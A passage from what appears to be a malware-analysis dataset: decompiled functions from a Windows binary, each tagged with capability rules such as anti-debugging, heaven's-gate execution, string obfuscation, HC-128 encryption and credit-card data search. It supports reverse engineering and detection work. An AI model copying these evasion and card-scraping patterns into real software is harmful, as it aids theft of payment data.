5;\n                    uVar10 = *0x411d84 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = *0x411d84 + (*0x411d84 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x411d84 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = *0x411d8c + *0x411d78;\n                    uVar5 = 1;\n                }\n                goto code_r0x0040cebe;\n            }\n            var_10h = *0x411d7c - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = *0x411d80 - 1;\n            iVar12 = *0x411d80 + (*0x411d80 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = *0x411d80 & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0040ccaa;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0040ccaa:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = *0x411d84 + 1;\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0040cebe:\n    var_20h = iVar12 << (0x1fU - *0x411d84 & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (*0x411d88 == 0x40) {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (*0x411d88 == 0x20) {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3644
    },
    "0040cf01": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040d1c3)\n// WARNING: Removing unreachable block (ram,0x0040d18c)\n// WARNING: Removing unreachable block (ram,0x0040d574)\n// WARNING: Removing unreachable block (ram,0x0040d19b)\n// WARNING: Removing unreachable block (ram,0x0040d1a3)\n// WARNING: Removing unreachable block (ram,0x0040d1a9)\n// WARNING: Removing unreachable block (ram,0x0040d1ac)\n// WARNING: Removing unreachable block (ram,0x0040d1b3)\n// WARNING: Removing unreachable block (ram,0x0040d1bd)\n// WARNING: Removing unreachable block (ram,0x0040d218)\n// WARNING: Removing unreachable block (ram,0x0040d212)\n// WARNING: Removing unreachable block (ram,0x0040d21e)\n// WARNING: Removing unreachable block (ram,0x0040d23b)\n// WARNING: Removing unreachable block (ram,0x0040d23d)\n// WARNING: Removing unreachable block (ram,0x0040d245)\n// WARNING: Removing unreachable block (ram,0x0040d248)\n// WARNING: Removing unreachable block (ram,0x0040d24d)\n// WARNING: Removing unreachable block (ram,0x0040d250)\n// WARNING: Removing unreachable block (ram,0x0040d57d)\n// WARNING: Removing unreachable block (ram,0x0040d25b)\n// WARNING: Removing unreachable block (ram,0x0040d594)\n// WARNING: Removing unreachable block (ram,0x0040d59b)\n// WARNING: Removing unreachable block (ram,0x0040d266)\n// WARNING: Removing unreachable block (ram,0x0040d279)\n// WARNING: Removing unreachable block (ram,0x0040d27b)\n// WARNING: Removing unreachable block (ram,0x0040d288)\n// WARNING: Removing unreachable block (ram,0x0040d28d)\n// WARNING: Removing unreachable block (ram,0x0040d293)\n// WARNING: Removing unreachable block (ram,0x0040d29c)\n// WARNING: Removing unreachable block (ram,0x0040d2a3)\n// WARNING: Removing unreachable block (ram,0x0040d2bb)\n// WARNING: Removing unreachable block (ram,0x0040d2cc)\n// WARNING: Removing unreachable block (ram,0x0040d2da)\n// WARNING: Removing unreachable block (ram,0x0040d319)\n// WARNING: Removing unreachable block (ram,0x0040d322)\n// WARNING: Removing unreachable block (ram,0x0040d53a)\n// WARNING: Removing unreachable block (ram,0x0040d330)\n// WARNING: Removing unreachable block (ram,0x0040d33a)\n// WARNING: Removing unreachable block (ram,0x0040d555)\n// WARNING: Removing unreachable block (ram,0x0040d347)\n// WARNING: Removing unreachable block (ram,0x0040d34e)\n// WARNING: Removing unreachable block (ram,0x0040d358)\n// WARNING: Removing unreachable block (ram,0x0040d35d)\n// WARNING: Removing unreachable block (ram,0x0040d36d)\n// WARNING: Removing unreachable block (ram,0x0040d372)\n// WARNING: Removing unreachable block (ram,0x0040d37c)\n// WARNING: Removing unreachable block (ram,0x0040d381)\n// WARNING: Removing unreachable block (ram,0x0040d393)\n// WARNING: Removing unreachable block (ram,0x0040d3a0)\n// WARNING: Removing unreachable block (ram,0x0040d3af)\n// WARNING: Removing unreachable block (ram,0x0040d3bc)\n// WARNING: Removing unreachable block (ram,0x0040d3d9)\n// WARNING: Removing unreachable block (ram,0x0040d3dd)\n// WARNING: Removing unreachable block (ram,0x0040d3e4)\n// WARNING: Removing unreachable block (ram,0x0040d3ed)\n// WARNING: Removing unreachable block (ram,0x0040d3f0)\n// WARNING: Removing unreachable block (ram,0x0040d401)\n// WARNING: Removing unreachable block (ram,0x0040d40f)\n// WARNING: Removing unreachable block (ram,0x0040d41a)\n// WARNING: Removing unreachable block (ram,0x0040d421)\n// WARNING: Removing unreachable block (ram,0x0040d44c)\n// WARNING: Removing unreachable block (ram,0x0040d451)\n// WARNING: Removing unreachable block (ram,0x0040d45c)\n// WARNING: Removing unreachable block (ram,0x0040d465)\n// WARNING: Removing unreachable block (ram,0x0040d46b)\n// WARNING: Removing unreachable block (ram,0x0040d46e)\n// WARNING: Removing unreachable block (ram,0x0040d494)\n// WARNING: Removing unreachable block (ram,0x0040d499)\n// WARNING: Removing unreachable block (ram,0x0040d49e)\n// WARNING: Removing unreachable block (ram,0x0040d4ab)\n// WARNING: Removing unreachable block (ram,0x0040d4bc)\n// WARNING: Removing unreachable block (ram,0x0040d4ed)\n// WARNING: Removing unreachable block (ram,0x0040d4c2)\n// WARNING: Removing unreachable block (ram,0x0040d4e8)\n// WARNING: Removing unreachable block (ram,0x0040d4cc)\n// WARNING: Removing unreachable block (ram,0x0040d4e2)\n// WARNING: Removing unreachable block (ram,0x0040d4db)\n// WARNING: Removing unreachable block (ram,0x0040d4f0)\n// WARNING: Removing unreachable block (ram,0x0040d51d)\n// WARNING: Removing unreachable block (ram,0x0040d4fa)\n// WARNING: Removing unreachable block (ram,0x0040d385)\n// WARNING: Removing unreachable block (ram,0x0040d362)\n// WARNING: Removing unreachable block (ram,0x0040d558)\n// WARNING: Removing unreachable block (ram,0x0040d29e)\n// WARNING: Removing unreachable block (ram,0x0040d562)\n// WARNING: Removing unreachable block (ram,0x0040d5a3)\n// WARNING: Variable defined which should be unmapped: var_7ch\n\nvoid __cdecl\nfcn.0040cf01(uint arg_8h, uint arg_ch, char *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            int32_t arg_24h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_9h;\n    uint var_4h;\n    \n    if (arg_24h == 0) {\n        puVar2 = fcn.004056fb();\n        *puVar2 = 0x16;\n        fcn.004065dc(0, 0, 0, 0, 0);\n        fcn.00405410(var_7ch);\n        return;\n    }\n    for (; (((cVar1 = *arg_10h,  cVar1 == ' ' || (cVar1 == '\\t')) || (cVar1 == '\\n')) || (cVar1 == '\\r'));\n        arg_10h = arg_10h + 1) {\n    }\n    // WARNING: Could not recover jumptable at 0x0040cf94. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (12 cases) at 0x40d5c9\n    (**0x40d5c9)();\n    return;\n}\n",
        "token_count": 1898
    },
    "0040e798": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0040e798(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x40e843;\n        var_38h = 1;\n    }\n    else {\n        pcStack40 = fcn.0040e86f;\n        uStack36 = *0x4110e8 ^ &fcn.0040e798::var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.0040e798::var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.00405af3();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &fcn.0040e798::var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 725
    },
    "0040eb30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040eb30(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00405f4c(0x40fb58, 0x10);\n    iVar1 = *(unaff_EBP + 0x10);\n    iVar2 = *(unaff_EBP + 8);\n    if (*(iVar1 + 4) < 0x81) {\n        iVar5 = *(iVar2 + 8);\n    }\n    else {\n        iVar5 = *(iVar2 + 8);\n    }\n    *(unaff_EBP + -0x1c) = iVar5;\n    iVar3 = fcn.00405af3();\n    *(iVar3 + 0x90) = *(iVar3 + 0x90) + 1;\n    *(unaff_EBP + -4) = 0;\n    while (iVar5 != *(unaff_EBP + 0x14)) {\n        if ((iVar5 < 0) || (*(iVar1 + 4) <= iVar5)) {\n            fcn.00407fc9();\n        }\n        iVar3 = iVar5 * 8;\n        piVar4 = *(iVar1 + 8) + iVar3;\n        iVar5 = *piVar4;\n        *(unaff_EBP + -0x20) = iVar5;\n        *(unaff_EBP + -4) = 1;\n        if (piVar4[1] != 0) {\n            *(iVar2 + 8) = iVar5;\n            fcn.0040f700(*(*(iVar1 + 8) + 4 + iVar3), iVar2, 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x1c) = iVar5;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0040ebf6();\n    if (iVar5 != *(unaff_EBP + 0x14)) {\n        fcn.00407fc9();\n    }\n    *(iVar2 + 8) = iVar5;\n    fcn.00405f91();\n    return;\n}\n",
        "token_count": 569
    },
    "0040ebf6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040ebf6(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00405af3();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.00405af3();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "0040eebe": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040eebe(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.0040e9d6(*(unaff_EBP + -0x28));\n    iVar1 = fcn.00405af3();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.00405af3();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.0040e9af(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.0040ec56(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 385
    },
    "004047ea": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004047ea(uint32_t arg_8h)\n\n{\n    fcn.004047c7();\n    if ((arg_8h & 1) != 0) {\n        fcn.00404989();\n    }\n    return;\n}\n",
        "token_count": 58
    },
    "004049ba": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004049ba(uint32_t arg_8h)\n\n{\n    fcn.004049aa();\n    if ((arg_8h & 1) != 0) {\n        fcn.00404989();\n    }\n    return;\n}\n",
        "token_count": 57
    },
    "00402fef": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nvoid fcn.00402fef(void)\n\n{\n    *0x428c21 = 0x6c;\n    *0x428c1b = 0x6d;\n    *0x428c1a = 0x69;\n    *0x428c1c = 0x67;\n    *0x428c20 = 100;\n    *0x428c23 = 0;\n    *0x428c1d = 0x33;\n    *0x428c19 = 0x73;\n    *0x428c22 = 0x6c;\n    *0x428c1f = 0x2e;\n    *0x428c1e = 0x32;\n    *0x428c18 = 0x6d;\n    (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x428c18);\n    return;\n}\n",
        "token_count": 197
    },
    "00403059": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid fcn.00403059(void)\n\n{\n    uint32_t *unaff_ESI;\n    uint32_t uVar1;\n    uint lpNumberOfEventsRead;\n    uint var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    uint32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_10h = *unaff_ESI;\n    var_34h = *0x4120e8;\n    uVar1 = unaff_ESI[1];\n    var_3ch = *0x4120ec;\n    var_8h = 0;\n    var_40h = -0x61c88647;\n    fcn.0040304f();\n    var_8h = var_8h + 0x23f;\n    var_2ch = *0x4120f0;\n    var_30h = *0x4120f4;\n    var_28h = 0x20;\n    do {\n        var_14h = 5;\n        var_4h = var_10h * 0x10 + var_2ch;\n        if (*0x43ec7c == 0xfa9) {\n            *0x43ec78 = 0xedeb2e40;\n        }\n        if (*0x43ec7c == 0x3eb) {\n            (*_sym.imp.KERNEL32.dll_InterlockedExchange)(&var_44h, 0);\n            *0x43d854 = 0;\n        }\n        var_24h = var_10h + var_8h;\n        var_ch = var_10h >> 5;\n        *0x43ec74 = 0xf4ea3dee;\n        fcn.00403056();\n        var_4h = var_4h ^ var_24h;\n        if (*0x43ec7c == 0x9e6) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(0);\n        }\n        var_ch = var_ch ^ var_4h;\n        if (*0x43ec7c == 0x213) {\n            (*_sym.imp.KERNEL32.dll_ReadConsoleInputW)(0, 0, 0, &lpNumberOfEventsRead);\n        }\n        uVar1 = uVar1 - var_ch;\n        var_1ch = 4;\n        var_24h = var_8h + uVar1;\n        var_ch = (uVar1 >> (var_14h & 0x1f)) + var_3ch;\n        *0x428c4c = 0;\n        var_20h = var_10h - (uVar1 * 0x10 + var_34h ^ var_24h ^ var_ch);\n        var_8h = var_8h - var_40h;\n        var_28h = var_28h + -1;\n        var_38h = uVar1;\n        var_18h = var_24h;\n        var_10h = var_20h;\n    } while (var_28h != 0);\n    unaff_ESI[1] = uVar1;\n    *unaff_ESI = var_20h;\n    return;\n}\n",
        "token_count": 810
    },
    "004031dc": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.004031dc(void)\n\n{\n    uint32_t uVar1;\n    uint lpDestStr;\n    uint lpDCB;\n    uint lpNumberOfCharsRead;\n    \n    for (uVar1 = *0x43ec7c >> 3; uVar1 != 0; uVar1 = uVar1 - 1) {\n        if (*0x43ec7c == 0x959) {\n            (*_sym.imp.KERNEL32.dll_BuildCommDCBA)(0, &lpDCB);\n            (*_sym.imp.KERNEL32.dll_ReadConsoleA)(0, 0, 0, &lpNumberOfCharsRead, 0);\n            (*_sym.imp.KERNEL32.dll_LCMapStringA)(0, 0, 0, 0, &lpDestStr, 0);\n            (*_sym.imp.KERNEL32.dll_GetCommTimeouts)(0, 0);\n            (*_sym.imp.KERNEL32.dll_IsBadStringPtrA)(0x402bf0, 0);\n        }\n        fcn.00403059();\n    }\n    return;\n}\n",
        "token_count": 236
    },
    "0040333e": {
        "rules": [
            "search for credit card data/ac143e9ae29c414184a69c9308e24693",
            "parse credit card information/f44d27b3cce043409e5315cf54d1899b"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: lpConsoleCursorInfo\n// WARNING: Variable defined which should be unmapped: dwCursorPosition\n// WARNING: Variable defined which should be unmapped: lpNumberOfCharsWritten\n// WARNING: Variable defined which should be unmapped: nSize\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040333e(void)\n\n{\n    uint32_t uVar1;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    int32_t iVar2;\n    uint unaff_EDI;\n    uchar auStackY9732 [2048];\n    uint lpBuffer;\n    uint lpDateStr;\n    uint var_1200h;\n    uint lpDestStr;\n    uint lpString1;\n    uint lpDCB;\n    uint lpCommTimeouts;\n    uint var_1dch;\n    uint uStackY476;\n    uint uStackY472;\n    uint uStackY468;\n    uint var_1cch;\n    uint var_1c8h;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_194h;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uchar *var_bch;\n    uint var_b8h;\n    uint *var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint *var_94h;\n    uint var_90h;\n    uint *var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint *var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint *var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint *var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint *var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uchar *var_3ch;\n    uint *var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint lpDate;\n    uchar var_1ch;\n    uchar uStackY31;\n    ushort uStackY30;\n    uint lpConsoleCursorInfo;\n    uint var_14h;\n    uint *var_10h;\n    uint nSize;\n    uint lpNumberOfCharsWritten;\n    uint dwCursorPosition;\n    \n    dwCursorPosition = 0x40334b;\n    fcn.0040e360();\n    nSize = unaff_EDI;\n    lpNumberOfCharsWritten = unaff_ESI;\n    dwCursorPosition = unaff_EBX;\n    if (*0x43ec7c == 0x66) {\n        var_10h = NULL;\n        var_14h._0_1_ = 0;\n        var_14h._1_1_ = 0;\n        var_14h._2_2_ = 0;\n        lpConsoleCursorInfo._0_1_ = 0;\n        lpConsoleCursorInfo._1_1_ = 0;\n        lpConsoleCursorInfo._2_2_ = 0;\n        var_1ch = 0;\n        uStackY31 = 0;\n        uStackY30 = 0;\n        lpDate._0_1_ = 0;\n        lpDate._1_1_ = 0;\n        lpDate._2_2_ = 0;\n        var_24h = 0x403364;\n        (*_sym.imp.WINHTTP.dll_WinHttpOpen)();\n        var_24h = NULL;\n        var_28h = &fcn.0040333e::lpDestStr;\n        var_2ch = 0;\n        var_30h = 0;\n        var_34h = 0;\n        var_38h = 0x403375;\n        (*_sym.imp.KERNEL32.dll_FoldStringA)();\n        var_38h = NULL;\n        var_3ch = NULL;\n        var_40h = 0x40337d;\n        (*_sym.imp.KERNEL32.dll_GetProcessPriorityBoost)();\n        var_40h = 0;\n        var_44h = 0;\n        var_48h = 0;\n        var_4ch = NULL;\n        var_50h = 0;\n        var_54h = 0;\n        var_58h = 0x403389;\n        (*_sym.imp.KERNEL32.dll_SetTimerQueueTimer)();\n        var_58h = 0;\n        var_5ch = NULL;\n        var_60h = 0;\n        